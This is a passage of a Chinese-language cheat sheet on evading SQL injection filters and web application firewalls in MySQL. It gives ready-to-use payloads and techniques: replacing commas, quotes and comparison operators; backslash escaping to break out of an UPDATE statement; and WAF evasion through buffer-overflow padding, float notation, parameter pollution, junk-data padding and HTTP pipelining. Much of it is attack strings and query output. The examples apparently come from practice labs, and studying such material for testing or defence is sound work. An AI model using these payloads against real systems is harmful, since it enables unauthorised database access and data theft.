 两个空格
 
 #过滤都逗号的情况
 盲注中可使用from pos for len
 substr((select database())from 1 for 1) == substr((select database()),1,1)
 使用join关键字
 select * from users where id=1 union select * from (select 1)a join (select 2)b join (select 3)c;
 使用like关键字
 mysql> select ascii(substr(database(),1,1))=115;
+-----------------------------------+
| ascii(substr(database(),1,1))=115 |
+-----------------------------------+
|                                 1 |
+-----------------------------------+
 mysql> select ascii(database()) like "115";
+------------------------------+
| ascii(database()) like "115" |
+------------------------------+
|                            1 |
+------------------------------+
#%起到通配的作用；
+-----------------------+
| database() like "se%" |
+-----------------------+
|                     1 |
+-----------------------+
 使用offset关键字，使用于limit中代替都好
 limit 2,1 ==> limit 1 offset 2; 
 
 #过滤引号
 16进制绕过
 'database' ==> 0x27646174616261736527
 字符编码为GBK等时，可以考虑宽字节
 使用\逃逸；假设有如下sql语句
 #sql="update user set pass = '{$password}' where username = '{$username}';";
 当我们传入password为`\`
得到sql语句
"update ctfshow_user set pass = ' \' where username = '{$username}';";
不难看出`\'where username =`段落被闭合，我们可以控制$username参数；
当我们出入参数为username = ,username=database()#
我们就可以得到 update xxx set pass ='x' ,username=database()#
从而绕过单引号的过滤

#过滤大小于号
strcmp(str1,str2)若所有的字符串均相同，则返回 0，若根据当前分类次序，第一个参数小于第二个，则返回 -1，其它情况返回 1
mysql> select * from users where id= 1 and !strcmp(ascii(substr(database(),1,1)),115);
+----+----------+----------+
| id | username | password |
+----+----------+----------+
|  1 | Dumb     | Dumb     |
+----+----------+----------+
#使用in关键字
select * from users where id=1 and substr(database(),1,1) in ("s");
+----+----------+----------+
| id | username | password |
+----+----------+----------+
|  1 | Dumb     | Dumb     |
+----+----------+----------+
select * from users where id=1 and substr(database(),1,1) in ("t");
Empty set (0.00 sec)
#使用between a and b 判等
mysql> select * from users where id =1 and substr(database(),1,1) between 's' and 's';
+----+----------+----------+
| id | username | password |
+----+----------+----------+
|  1 | Dumb     | Dumb     |
+----+----------+----------+
select * from users where id =1 and substr(database(),1,1) between 't' and 't';
Empty set

#缓冲区溢出
有些waf是使用C语言编写，C语言自身没有缓冲区保护机制，如果waf在处理测试时超出缓冲区长度们就会造成bug达到绕过
?id=1 and (select 1)=(Select 0xA*1000)+UnIoN+SeLeCT+1,2,version(),4,5,database(),user(),8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26
(select 1)=(Select 0xA*1000)后半段语句意为，测试，将A重复1000次

#浮点数绕过
id=1+union+select ==> id=1.0union select ==> id=1E0union select 

#参数污染绕过
php语言中所传的参数，后一个会覆盖前一个(id=1&id=2)，可以利用这点进行waf的绕过
id=id=1&id=1'union select 1,2,database()-- -                           '
 
#脏数据污染
get方法可能会有长度限制，post无长度限制最优，在查询语句前面填上脏数据，后面跟正常的查询语句进行查询
id=/*!11111111111111111111111.....................................*/union select 1,2,database()--+

#pipline绕过
apache等容器通过关键词connection判断是否断开tcp连接(close/keep-alive),一次发送容量过大时，值会变成keep-alive，本次发送不断开，直到为close为止
方法： 关闭update content-length
	  两个包放在一起，将connection改为keep-alive
	  第二个包的数据改为正常，手动修改第二个包的conten-length为提交数据的长度
	  
#白名单绕过
可以利用该站点下的白名单文件传参进行绕过

#{}绕过，{}内前半部分是注释内容，后半部分是语句

#反引号绕过
select * from users where id =1  and 'sleep(3)';

#这些绕过方法都有可能存在版本问题，注意甄别版本
```



## 参考链接

https://wiki.wgpsec.org/knowledge/web/mysql-write-shell.html

https://www.cnblogs.com/fzblog/p/13800604.html

https://www.sqlsec.com/2020/11/mysql.html

https://www.anquanke.com/post/id/268428#h3-5

https://www.leavesongs.com/PENETRATION/sql-injections-in-mysql-limit-clause.html
